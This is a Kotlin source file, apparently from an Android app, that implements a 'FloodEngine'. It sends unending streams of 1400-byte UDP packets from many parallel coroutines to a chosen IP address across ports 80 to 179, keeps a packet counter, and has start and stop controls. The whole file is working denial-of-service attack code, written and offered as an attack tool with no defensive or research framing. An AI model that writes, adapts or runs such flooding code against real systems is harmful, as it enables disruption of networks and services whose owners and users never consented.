package com.twks.wifi

import android.util.Log
import kotlinx.coroutines.*
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.util.concurrent.atomic.AtomicLong

object FloodEngine {
    @Volatile private var isAttacking = false
    private val packetCount = AtomicLong(0)
    private val jobScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var activeJobs = mutableListOf<Job>()

    fun startFlood(targetIp: String, threads: Int) {
        if (isAttacking) return
        isAttacking = true
        packetCount.set(0)
        activeJobs.clear()

        val payload = ByteArray(1400) { 'T'.code.toByte() }
        val address = try {
            InetAddress.getByName(targetIp)
        } catch (e: Exception) {
            Log.e("TWKS", "Invalid IP: $targetIp", e)
            return
        }

        for (i in 0 until threads) {
            val job = jobScope.launch {
                var localCount = 0L
                var socket: DatagramSocket? = null
                try {
                    socket = DatagramSocket()
                    socket.sendBufferSize = 8388608 // 8MB буфер
                    val port = 80 + (i % 100)
                    
                    while (isAttacking) {
                        val packet = DatagramPacket(payload, payload.size, address, port)
                        socket.send(packet)
                        localCount++
                        
                        // Пакетное обновление счетчика для производительности
                        if (localCount >= 500) {
                            packetCount.addAndGet(localCount)
                            localCount = 0L
                        }
                    }
                } catch (e: Exception) {
                    Log.e("TWKS", "Flood thread error", e)
                } finally {
                    packetCount.addAndGet(localCount)
                    socket?.close()
                }
            }
            activeJobs.add(job)
        }
        Log.i("TWKS", "Started $threads flood threads to $targetIp")
    }

    fun stopFlood() {
        isAttacking = false
        jobScope.coroutineContext[Job]?.cancelChildren()
        activeJobs.clear()
        Log.i("TWKS", "Flood stopped")
    }

    fun getPacketCount(): Long = packetCount.get()
}
